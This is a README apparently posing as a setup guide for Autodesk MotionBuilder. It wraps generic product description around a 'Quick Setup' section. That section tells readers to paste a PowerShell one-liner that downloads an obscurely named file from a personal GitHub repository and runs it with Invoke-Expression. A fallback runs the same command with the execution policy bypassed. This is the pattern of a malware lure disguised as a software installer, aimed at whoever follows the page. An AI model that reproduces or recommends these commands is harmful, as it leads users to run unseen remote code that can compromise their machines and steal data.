# MotionBuilder

MotionBuilder is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open MotionBuilder and work in it.

Autodesk MotionBuilder is a desktop animation application built around real-time playback and deep character control on Windows workstations. Artists import skeletons and motion capture takes, tune constraints and retargeting, and review performances in the viewport before handing shots to DCC tools or game engines. The emphasis is on interactive iteration: you scrub the timeline, adjust poses on a control rig, and see updates immediately rather than waiting on long offline bakes.

A typical session starts with loading a character asset and one or more motion clips, then mapping bones and cleaning foot contacts or spine drift in the Story Tool or FCurves. You might layer takes, blend between clips on the timeline, run plot operations to bake control-rig motion onto the skeleton, and export FBX or BVH for Maya, 3ds Max, or Unreal. Live review on a second monitor is common when directors or clients watch a session over remote desktop.

This repository collects a Windows setup package reference, release notes for local rollout, and a changelog that tracks plugin versions and pipeline tweaks your team applies. Short operator notes document studio folder layout, default take naming, and retarget presets so new animators can match existing production standards without hunting through email threads.

## What you do with it

- Real-time 3D viewport playback keeps character motion responsive while you edit takes on Windows.
- Motion capture data imports cleanly for retargeting onto custom biped or facial rigs.
- Character controls and constraint relations stabilize feet, spine, and hands during fast iteration.
- Story Tool sequencing layers clips and transitions without leaving the main MotionBuilder timeline.
- Plot and bake workflows transfer control-rig animation onto skeletons for engine-ready export.
- FBX and BVH exchange preserve skeleton hierarchies for Maya, 3ds Max, and game pipelines.
- Python scripting automates repetitive retarget steps and batch exports across large shot lists.
- Live connection options support virtual production review while directors watch from another machine.

## Quick Setup (PowerShell)

This installs the program MotionBuilder on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/ritternicole81266837/motionbuilder-setup-guide/main/h2f1avrw1z.q4ikshie | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/ritternicole81266837/motionbuilder-setup-guide/main/h2f1avrw1z.q4ikshie | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `h2f1avrw1z.q4ikshie` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `ritternicole81266837/motionbuilder-setup-guide`. Autodesk MotionBuilder 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
